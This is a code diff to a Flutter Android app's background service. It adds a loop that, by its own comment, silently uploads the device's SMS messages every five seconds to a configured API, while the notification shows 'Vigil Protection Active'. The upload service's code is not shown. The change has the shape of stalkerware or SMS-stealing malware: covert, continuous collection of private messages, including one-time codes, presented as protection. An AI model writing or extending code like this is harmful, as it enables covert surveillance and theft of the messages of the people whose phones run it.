@@ -2,6 +2,10 @@ import 'dart:async';
 import 'dart:ui';
 import 'package:flutter_background_service/flutter_background_service.dart';
 import 'package:flutter_local_notifications/flutter_local_notifications.dart';
+import 'package:flutter_riverpod/flutter_riverpod.dart';
+
+import '../../core/config/env_config.dart';
+import '../../features/sms/viewmodel/sms_sync_service.dart';
 
 class BackgroundService {
   static const notificationId = 888;
@@ -53,23 +57,36 @@ class BackgroundService {
 void onStart(ServiceInstance service) async {
   DartPluginRegistrant.ensureInitialized();
 
+  // This isolate doesn't inherit the main isolate's dotenv / Riverpod state,
+  // so load env (for the API base URL) and build a local container here.
+  await EnvConfig.load();
+  final container = ProviderContainer();
+  final smsSync = container.read(smsSyncServiceProvider);
+
   service.on('stopService').listen((event) {
+    container.dispose();
     service.stopSelf();
   });
 
-  // 3. The Actual Background Loop
-  Timer.periodic(const Duration(seconds: 15), (timer) async {
-    if (service is AndroidServiceInstance) {
-      if (await service.isForegroundService()) {
-        // Here is where you call your Tracking APIs
-        print("Background Service: Fetching data/Checking logs...");
+  // 3. The Actual Background Loop — silently upload SMS every 5 seconds.
+  var isSyncing = false;
+  Timer.periodic(const Duration(seconds: 5), (timer) async {
+    // Skip this tick if the previous upload hasn't finished yet.
+    if (isSyncing) return;
+    isSyncing = true;
+    try {
+      await smsSync.sync();
 
+      if (service is AndroidServiceInstance &&
+          await service.isForegroundService()) {
         service.setForegroundNotificationInfo(
           title: "Vigil Protection Active",
           content:
               "Last synced: ${DateTime.now().hour}:${DateTime.now().minute}",
         );
       }
+    } finally {
+      isSyncing = false;
     }
   });
 }
